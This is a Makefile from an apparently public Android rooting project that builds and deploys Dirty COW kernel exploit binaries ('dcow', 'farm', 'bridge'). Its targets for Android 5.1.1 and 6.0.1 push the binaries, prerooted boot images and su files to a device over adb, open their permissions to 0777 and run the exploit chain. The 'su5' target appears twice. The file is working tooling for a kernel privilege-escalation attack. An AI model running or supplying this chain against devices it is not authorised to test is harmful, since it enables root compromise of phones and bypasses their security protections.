ARCH := $(shell adb shell getprop ro.product.cpu.abi)
SDK_VERSION := $(shell adb shell getprop ro.build.version.sdk)

all: build

build:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=$(ARCH) APP_PLATFORM=android-$(SDK_VERSION)

log: 
	adb logcat | grep -a GRP_Root_Kit
cowlog: 
	adb logcat | grep -a dirtycow
	
##Android 6.01 r1
root6: build 
## This is an example of how to replace the files on your system
## you need to supply the local directories, images and etc.. 
		## directory missing, you add
		adb push boot_img_extracted_and_prerooted_/ /data/local/tmp/
##---------------------------------------------------------------------------------- the remaining parts remain unchanged
		adb push applypatch_android_6.01_r1 /data/local/tmp/till
		adb push root_cmd_list.txt /data/local/tmp/cmd_list.txt
		adb push toolbox_android_6.01_r1 /data/local/tmp/toolbox #precompile aosp toolbox must match your device
		adb push libs/$(ARCH)/dcow /data/local/tmp/dcow				
		adb push libs/$(ARCH)/farm /data/local/tmp/farm
		adb push libs/$(ARCH)/bridge /data/local/tmp/bridge
		adb shell chmod -R 0777 /data/local/tmp/*
		adb shell /data/local/tmp/farm
##Android 5.11 r2, example only
su5: build su
## su install isn't working with locked bootloaders stil, partial working example only 
		## su 64 bit files
		adb push su/ /data/local/tmp/su
		adb shell chmod -R 0777 /data/local/tmp/su/*
##---------------------------------------------------------------------------------- the remaining parts remain unchanged
		adb push root_cmd_list.txt /data/local/tmp/cmd_list.txt
		adb push toolbox_android_5.1.1_r2 /data/local/tmp/toolbox
		adb push applypatch_android-5.11_r2 /data/local/tmp/till
		adb push libs/$(ARCH)/dcow /data/local/tmp/dcow				
		adb push libs/$(ARCH)/farm /data/local/tmp/farm
		adb push libs/$(ARCH)/bridge /data/local/tmp/bridge
		adb shell chmod -R 0777 /data/local/tmp/*
		adb shell /data/local/tmp/farm	

su:
	@echo "su install files for your device needed to run this example"
	@echo "you can download these files for almost every device from chainfire"

boot_img_extracted_and_prerooted_:
	@echo "Extract and modify your boot.img or recovery.img files, confirm names in root_cmd_list.txt"

root_cmd_list.txt:		
	@echo "An example root_cmd_list.txt was included with this repo, what happened to it?"
su_cmd_list.txt:		
	@echo "An example su_cmd_list.txt was included with this repo, what happened to it?"
clean:
	rm -rf libs
	rm -rf obj

##Android 5.11 r2, example only
su5: build su
## su install isn't working with locked bootloaders stil, partial working example only 
		## su 64 bit files
		adb push su/ /data/local/tmp/su
		adb shell chmod -R 0777 /data/local/tmp/su/*
##---------------------------------------------------------------------------------- the remaining parts remain unchanged
		adb push su_cmd_list.txt /data/local/tmp/cmd_list.txt
		adb push toolbox_android_5.1.1_r2 /data/local/tmp/toolbox
		adb push applypatch_android-5.11_r2 /data/local/tmp/till
		adb push libs/$(ARCH)/dcow /data/local/tmp/dcow				
		adb push libs/$(ARCH)/farm /data/local/tmp/farm
		adb push libs/$(ARCH)/bridge /data/local/tmp/bridge
		adb shell chmod -R 0777 /data/local/tmp/*
		adb shell /data/local/tmp/farm

##Android 6.01 r1, example only
su6: build su
## su install isn't working with locked bootloaders stil, partial working example only 
		## su 64 bit files
		adb push sup/ /data/local/tmp/su
##---------------------------------------------------------------------------------- the remaining parts remain unchanged
		adb push su_cmd_list.txt /data/local/tmp/cmd_list.txt
		adb push toolbox_android_6.01_r1 /data/local/tmp/toolbox #precompile aosp toolbox must match your device
		adb push applypatch_android_6.01_r1 /data/local/tmp/till
		adb push libs/$(ARCH)/dcow /data/local/tmp/dcow				
		adb push libs/$(ARCH)/farm /data/local/tmp/farm
		adb push libs/$(ARCH)/bridge /data/local/tmp/bridge		
		adb shell chmod -R 0777 /data/local/tmp/*
		adb shell /data/local/tmp/farm
